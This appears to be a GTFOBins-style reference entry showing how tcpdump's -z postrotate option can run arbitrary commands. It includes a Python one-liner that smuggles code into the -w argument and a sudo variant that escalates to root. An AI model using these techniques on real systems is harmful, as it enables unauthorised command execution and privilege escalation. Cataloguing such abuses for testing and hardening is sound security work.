---
description: |
  These require some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.

  In recent distributions (e.g., Debian 10 and Ubuntu 18) AppArmor limits the `postrotate-command` to a small subset of predefined commands thus preventing the execution of the following.
functions:
  command:
    - description: This requires several commands.
      code: |
        COMMAND='id'
        TF=$(mktemp)
        echo "$COMMAND" > $TF
        chmod +x $TF
        tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF
    - descprition: One-liner to run arbitrary command leveraging python argument parser that does not require a space between the option -c and the value.
      code: |
        tcpdump -ln -i lo -w -c__import__\(\"os\"\).system\(\"id\"\) -W 1 -G 1 -z /usr/bin/python
  sudo:
    - code: |
        COMMAND='id'
        TF=$(mktemp)
        echo "$COMMAND" > $TF
        chmod +x $TF
        sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
---
